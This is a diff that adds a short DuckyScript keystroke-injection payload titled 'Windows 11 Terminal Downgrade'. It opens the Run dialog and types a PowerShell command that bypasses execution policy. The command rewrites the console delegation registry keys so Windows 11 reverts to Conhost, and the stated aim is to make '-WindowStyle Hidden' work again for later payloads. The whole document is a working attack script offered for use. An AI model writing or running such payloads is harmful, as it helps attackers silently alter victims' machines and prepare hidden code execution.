@@ -1,0 +1,10 @@
+REM Title: Windows 11 Terminal Downgrade
+REM Description: Downgrade the default command prompt of Windows 11 to use Conhost again. Afterwards PowerShell can be used with paramters like "-WindowStyle Hidden" again.
+REM Target: Windows 11
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -Ep Bypass -C $k='HKCU:\Console\%%Startup';$v='{B23D10C0-E52E-411E-9D5B-C09FDF709C7D}';Set-ItemProperty $k -N DelegationConsole -V $v;Set-ItemProperty $k -N DelegationTerminal -V $v
+DELAY 500
+ENTER
